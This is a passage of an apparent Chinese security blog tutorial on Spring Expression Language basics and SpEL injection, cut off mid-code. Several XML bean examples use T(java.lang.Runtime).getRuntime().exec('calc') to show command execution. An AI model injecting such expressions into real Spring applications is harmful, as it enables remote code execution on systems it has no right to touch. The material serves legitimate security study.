    <content type="html"><![CDATA[<h1 id="SpEL-表达式注入"><a href="#SpEL-表达式注入" class="headerlink" title="SpEL 表达式注入"></a>SpEL 表达式注入</h1><h1 id="1、SpEL-基础"><a href="#1、SpEL-基础" class="headerlink" title="1、SpEL 基础"></a>1、SpEL 基础</h1><h2 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1 简介"></a>1.1 简介</h2><p>在 Spring3 中引入了 Spring 表达式语言（Spring Expression Language，简称 SpEL），是一种强大的<strong>运行时查询和操作对象图的语言</strong>，语法类似于Jakarta表达语句，但额外支持方法调用和基本字符串模板。SpEL旨在为Spring社区提供一种统一且功能全面的表达式语言，适用于所有Spring产品，并根据这些产品的需要设计了其特性。尽管SpEL是Spring框架的一部分，但它可以独立于Spring使用。通常情况下，用户只需编写简单的表达式字符串即可利用SpEL的功能，无需关心底层架构细节。例如，在基于XML或注解的bean定义中集成SpEL就是一个常见应用。</p><p>SpEL 表达式必须使用占位符语法 <code>#{SpelExpression}</code>，以便它们可以嵌入到纯文本字符串中（换句话说，SpEL 启用了表达式模板）。</p><p>SpEL 还可使用 <code>@BeanID语法在注册表中查找 Bean</code> （通常是 Spring 注册表）。例如，使用 ID、<code>headerUtils</code> 和方法 <code>count （）</code> （计数当前消息中的标头数）指定 bean，可以在 SpEL predicate 中使用 <code>headerUtils</code> bean，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">#&#123;@headerUtils.count &gt; 4&#125;<br></code></pre></td></tr></table></figure><h2 id="1-2-表达式类型"><a href="#1-2-表达式类型" class="headerlink" title="1.2 表达式类型"></a>1.2 表达式类型</h2><h3 id="1-2-1-字面值"><a href="#1-2-1-字面值" class="headerlink" title="1.2.1 字面值"></a>1.2.1 字面值</h3><p>最简单的 SpEL 表达式就是仅包含一个字面值。</p><p>下面我们在 XML 配置文件中使用 SpEL 设置类属性的值为字面值，此时需要用到 <code>#{}</code> 定界符，注意若是指定为字符串的话需要添加单引号括起来：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;message1&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;#&#123;666&#125;&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;message1&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;#&#123;aaaa&#125;&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><p>还可以直接与字符串混用：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;message1&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;the value is #&#123;666&#125;&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><h3 id="1-2-2-Demo"><a href="#1-2-2-Demo" class="headerlink" title="1.2.2 Demo"></a>1.2.2 Demo</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.basicspel;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloWorld</span> &#123;<br>    <span class="hljs-keyword">private</span> String message;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setMessage</span><span class="hljs-params">(String message)</span> &#123;<br>        <span class="hljs-built_in">this</span>.message = message;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getMessage</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Your Message :&quot;</span> + message);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.basicspel;<br><br><span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;<br><span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;<br><span class="hljs-keyword">import</span> org.springframework.context.ApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;<br><br><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BasicSpElApplication</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span class="hljs-string">&quot;Demo.xml&quot;</span>);<br>        <span class="hljs-type">HelloWorld</span> <span class="hljs-variable">helloWorld</span> <span class="hljs-operator">=</span> context.getBean(<span class="hljs-string">&quot;helloWorld&quot;</span>, HelloWorld.class);<br>        helloWorld.getMessage();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag">  http://www.springframework.org/schema/beans/spring-beans-3.0.xsd &quot;</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;helloWorld&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.src.basicspel.HelloWorld&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;message&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;#&#123;&#x27;aaa&#x27;&#125; is #&#123;3333&#125;&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171207819.png" alt="img"></p><p>参考 Drunkbaby 师傅的文章：</p><h2 id="1-3-引用-Bean"><a href="#1-3-引用-Bean" class="headerlink" title="1.3 引用 Bean"></a>1.3 引用 Bean</h2><p>SpEl 表达式能够通过其他 Bean 的 ID 进行引用，直接在 #{} 符号中写入 ID 名即可，无需添加单引号：</p><p>原来的写法：<code>&lt;constructor-arg ref=&quot;test&quot;/&gt;</code></p><p>在 SpEL 中：<code>&lt;constructor-arg value=&quot;#{test}&quot;&gt;</code></p><h3 id="1-3-1-Demo"><a href="#1-3-1-Demo" class="headerlink" title="1.3.1 Demo"></a>1.3.1 Demo</h3><p>SpellChecker.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.basicspel;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpellChecker</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SpellChecker</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Inside SpellChecker constructor.&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkSpelling</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Inside checkSpelling.&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>TextEditor.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.basicspel;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TextEditor</span> &#123;<br>    <span class="hljs-keyword">private</span> SpellChecker spellChecker;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TextEditor</span><span class="hljs-params">(SpellChecker spellChecker)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Inside TextEditor constructor.&quot;</span> );<br>        <span class="hljs-built_in">this</span>.spellChecker = spellChecker;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">spellCheck</span><span class="hljs-params">()</span> &#123;<br>        spellChecker.checkSpelling();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>RefSpellAndEditor.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.basicspel;<br><br><span class="hljs-keyword">import</span> org.springframework.context.ApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RefSpellAndEditor</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span class="hljs-string">&quot;editor.xml&quot;</span>);<br>        <span class="hljs-type">TextEditor</span> <span class="hljs-variable">editor</span> <span class="hljs-operator">=</span> context.getBean(<span class="hljs-string">&quot;textEditor&quot;</span>, TextEditor.class);<br>        editor.spellCheck();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>editor.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag">  http://www.springframework.org/schema/beans/spring-beans-3.0.xsd &quot;</span>&gt;</span><br><br>  <span class="hljs-comment">&lt;!-- Definition for spellChecker bean --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;spellChecker&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.src.basicspel.SpellChecker&quot;</span> /&gt;</span><br><br>  <span class="hljs-comment">&lt;!-- Definition for textEditor bean --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;textEditor&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.src.basicspel.TextEditor&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--&lt;constructor-arg ref=&quot;spellChecker&quot;/&gt;--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;#&#123;spellChecker&#125;&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171209680.png" alt="img"></p><h2 id="1-4-引用类属性"><a href="#1-4-引用类属性" class="headerlink" title="1.4  引用类属性"></a>1.4  引用类属性</h2><p>SpEL 表达式能够访问类的属性。</p><p>比如， 参赛者 Drunkbaby  是一位模仿高手，Johnford 唱什么歌，弹奏什么乐器，他就唱什么歌，弹奏什么乐器：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;kenny&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.spring.entity.Instrumentalist&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">p:song</span>=<span class="hljs-string">&quot;May Rain&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">p:instrument-ref</span>=<span class="hljs-string">&quot;piano&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;Drunkbaby&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.spring.entity.Instrumentalist&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;instrument&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;#&#123;kenny.instrument&#125;&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;song&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;#&#123;kenny.song&#125;&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br></code></pre></td></tr></table></figure><p>key 指定 <code>kenny&lt;bean&gt;</code> 的 id<br>value 指定 <code>kenny&lt;bean&gt;</code>的 song 属性。其等价于执行下面的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Instrumentalist</span> <span class="hljs-variable">carl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Instrumentalist</span>();<br>carl.setSong(kenny.getSong());<br></code></pre></td></tr></table></figure><h2 id="1-5-引用类方法"><a href="#1-5-引用类方法" class="headerlink" title="1.5  引用类方法"></a>1.5  引用类方法</h2><p>SpEL 表达式还可以访问类的方法。</p><p>假设现在有个 <code>SongSelector</code> 类，该类有个 <code>selectSong()</code> 方法，这样的话 Drunkbaby 就可以不用模仿别人，开始唱 <code>songSelector</code> 所选的歌了：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;song&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;#&#123;SongSelector.selectSong()&#125;&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><p>carl 有个癖好，歌曲名不是大写的他就浑身难受，我们现在要做的就是仅仅对返回的歌曲调用 <code>toUpperCase()</code> 方法：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;song&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;#&#123;SongSelector.selectSong().toUpperCase()&#125;&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><p>注意：这里我们不能确保不抛出 <code>NullPointerException</code>，为了避免这个讨厌的问题，我们可以使用 SpEL 的 <code>null-safe</code> 存取器：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;song&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;#&#123;SongSelector.selectSong()?.toUpperCase()&#125;&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><p><code>?.</code> 符号会确保左边的表达式不会为 <code>null</code>，如果为 <code>null</code> 的话就不会调用 <code>toUpperCase()</code> 方法了。</p><h2 id="1-6-类类型表达式-T-Type"><a href="#1-6-类类型表达式-T-Type" class="headerlink" title="1.6 类类型表达式 T(Type)"></a>1.6 类类型表达式 T(Type)</h2><p>在 SpEL 表达式中，使用 <code>T(Type)</code> 运算符会调用类的作用域和方法。换句话说，就是可以通过该类类型表达式来操作类。</p><p>使用 <code>T(Type)</code> 来表示 <code>java.lang.Class</code> 实例，Type 必须是类全限定名，但 <code>”java.lang”</code> 包除外，因为 SpEL 已经内置了该包，即该包下的类可以不指定具体的包名；使用类类型表达式还可以进行访问类静态方法和类静态字段。</p><p>这里就有潜在的攻击面了<br>因为我们 <code>java.lang.Runtime</code> 这个包也是包含于 <code>java.lang</code> 的包的，所以如果能调用 <code>Runtime</code>就可以进行命令执行</p><p>在 XML 配置文件中的使用示例，要调用 <code>java.lang.Math</code> 来获取 0~1 的随机数:</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;random&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;#</span></span></span><span class="hljs-template-variable">&#123;T(java.lang.<span class="hljs-keyword">Math</span>).random()&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>/&gt;</span></span><br></code></pre></td></tr></table></figure><p>简单来说，<strong>在 SpEL 中， T(Type) 用于 获取一个 Java 类的 Class 对象</strong>，例如：</p><p><code>T(java.lang.String)</code>  返回  <code>java.lang.String.class</code>。返回 Class 后，就可以调用类的静态方法、获取类的静态字段等等，而 T(Type) <strong>允许任意加载类、调用静态方法</strong>，那么也就可以执行敏感操作，例如：<code>T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)</code>，如果上下文没有限制 SpEL 的访问类型，那么意味着：SpEL &#x3D; 远程命令访问。</p><h3 id="1-6-1-Demo"><a href="#1-6-1-Demo" class="headerlink" title="1.6.1 Demo"></a>1.6.1 Demo</h3><p>修改 Demo.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">   <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">   <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag"> http://www.springframework.org/schema/beans/spring-beans-3.0.xsd &quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;helloWorld&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.src.basicspel.HelloWorld&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;message&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;#&#123;&#x27;aaa&#x27;&#125; is #&#123;T(java.lang.Math).random()&#125;&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171209529.png" alt="img"></p><h3 id="1-6-2-恶意调用并执行命令"><a href="#1-6-2-恶意调用并执行命令" class="headerlink" title="1.6.2 恶意调用并执行命令"></a>1.6.2 恶意调用并执行命令</h3><p>修改 Value 中的类类型表达式的类为 Runtime 并调用命令执行方法：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">   <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">   <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag"> http://www.springframework.org/schema/beans/spring-beans-3.0.xsd &quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;helloWorld&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.src.basicspel.HelloWorld&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;message&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;#&#123;&#x27;aaa&#x27;&#125; is #&#123;T(java.lang.Runtime).getRuntime.exec(&#x27;calc&#x27;)&#125;&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171209602.png" alt="img"></p><h1 id="2、SpEL-用法"><a href="#2、SpEL-用法" class="headerlink" title="2、SpEL 用法"></a>2、SpEL 用法</h1><p>SpEL 的用法有三种形式，一种是在注解 <code>@Value</code> 中；一种是 XML 配置；最后一种是在代码块中使用 Expression。</p><h2 id="2-1-XML-配置"><a href="#2-1-XML-配置" class="headerlink" title="2.1  XML 配置"></a>2.1  XML 配置</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">   <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">   <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag"> http://www.springframework.org/schema/beans/spring-beans-3.0.xsd &quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;helloWorld&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.src.basicspel.HelloWorld&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;message&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;#&#123;&#x27;aaa&#x27;&#125; is #&#123;T(java.lang.Runtime).getRuntime.exec(&#x27;calc&#x27;)&#125;&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="2-2-注解-Value"><a href="#2-2-注解-Value" class="headerlink" title="2.2 注解 @Value"></a>2.2 注解 <code>@Value</code></h2><p>这种形式的值一般是写在 properties 的配置文件中的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EmailSender</span> &#123;<br>    <span class="hljs-meta">@Value(&quot;$&#123;spring.mail.username&#125;&quot;)</span><br>    <span class="hljs-keyword">private</span> String mailUsername;<br>    <span class="hljs-meta">@Value(&quot;#&#123; systemProperties[&#x27;user.region&#x27;] &#125;&quot;)</span>    <br>    <span class="hljs-keyword">private</span> String defaultLocale;<br>    <span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-3-Expression-用法"><a href="#2-3-Expression-用法" class="headerlink" title="2.3 Expression 用法"></a>2.3 Expression 用法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//创建解析器</span><br><span class="hljs-type">ExpressionParser</span> <span 